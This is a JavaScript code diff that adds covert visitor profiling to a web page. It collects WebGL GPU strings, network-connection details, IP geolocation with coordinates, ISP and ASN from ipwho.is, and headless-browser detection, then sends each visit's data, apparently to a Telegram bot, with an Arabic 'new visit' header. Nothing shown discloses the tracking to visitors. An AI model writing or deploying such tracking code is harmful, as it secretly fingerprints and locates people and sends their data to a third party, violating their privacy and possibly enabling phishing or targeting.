@@ -80,6 +80,45 @@ function canvasFp() {
   } catch (e) { return 'n/a'; }
 }
 
+function webglInfo() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return 'n/a';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const r = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    return String(r).slice(0, 110);
+  } catch (e) { return 'n/a'; }
+}
+
+function netInfo() {
+  const c = navigator.connection || {};
+  const parts = [];
+  if (c.effectiveType) parts.push(c.effectiveType);
+  if (c.downlink) parts.push(c.downlink + 'Mb/s');
+  if (c.rtt != null) parts.push('rtt:' + c.rtt + 'ms');
+  return parts.join(' ') || 'n/a';
+}
+
+async function geoIP(ip) {
+  try {
+    const ctl = new AbortController();
+    const t = setTimeout(() => ctl.abort(), 6000);
+    const r = await fetch('https://ipwho.is/' + ip, { signal: ctl.signal });
+    clearTimeout(t);
+    const j = await r.json();
+    if (!j.success) return null;
+    const conn = j.connection || {};
+    return {
+      loc: [j.city, j.region, j.country].filter(Boolean).join(', '),
+      coords: (j.latitude != null) ? j.latitude + ',' + j.longitude : 'n/a',
+      isp: conn.isp || 'n/a',
+      org: conn.org || 'n/a',
+      asn: conn.asn ? 'AS' + conn.asn : 'n/a'
+    };
+  } catch (e) { return null; }
+}
+
 async function getIP() {
   try {
     const ctl = new AbortController();
@@ -121,16 +160,24 @@ async function logVisit() {
   const ip = await getIP();
   window._ip = ip;
   const d = deviceInfo();
+  const g = await geoIP(ip);
   const time = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Cairo' }) + ' (Cairo)';
+  const gpu = webglInfo();
+  const net = netInfo();
+  const geo = g ? `\n📍 ${g.loc}\n📌 ${g.coords}\n🏢 ${g.isp} | ${g.org} | ${g.asn}` : '\n📍 geo: n/a';
+  const headless = navigator.webdriver ? 'yes' : 'no';
   tg(
 `👁️ زيارة جديدة
 🆔 ${sessionId}
 🕐 ${time}
-🌐 IP: ${ip}
+🌐 IP: ${ip}${geo}
 💻 ${d.platform} | ${d.ua}
+🎮 GPU: ${gpu}
+📶 net: ${net}
 🗣️ ${d.lang}
 🌍 ${d.tz}
-📐 ${d.screen} | touch:${d.touch} | cpu:${d.cores} | ram:${d.mem}
+📐 ${d.screen} | dpr:${window.devicePixelRatio || '?'} | touch:${d.touch} | cpu:${d.cores} | ram:${d.mem}
+🤖 headless: ${headless} | cookies:${navigator.cookieEnabled ? 'on' : 'off'}
 🔗 ref: ${d.ref}
 #️⃣ fp: ${d.fp}`
   );
